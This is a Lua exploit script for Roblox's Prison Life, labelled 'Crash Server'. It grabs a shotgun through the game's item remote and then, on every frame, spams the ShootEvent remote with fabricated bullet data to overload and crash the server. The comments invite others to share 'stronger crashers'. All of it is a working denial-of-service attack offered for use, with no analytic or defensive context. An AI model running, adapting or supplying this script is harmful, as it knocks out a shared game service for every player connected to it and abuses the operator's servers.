-- Credits To: Jake11price
-- If u would like to modify/make better script than this one or if u have a stronger crasher for prison life please post it in comments or simply publish them
-- Crash Server:
local Gun = "Remington 870"

local Player = game.Players.LocalPlayer.Name

game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)

for i,v in pairs(game.Players[Player].Backpack:GetChildren()) do
    if v.name == (Gun) then
        v.Parent = game.Players.LocalPlayer.Character
    end
end

Gun = game.Players[Player].Character[Gun]

game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()

function FireGun(target)
coroutine.resume(coroutine.create(function()
local bulletTable = {}
table.insert(bulletTable, {
Hit = target,
Distance = 100,
Cframe = CFrame.new(0,1,1),
RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
})
game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
wait()
end))
end

while game:GetService("RunService").Stepped:wait() do
for count = 0, 10, 10 do
FireGun()
end
end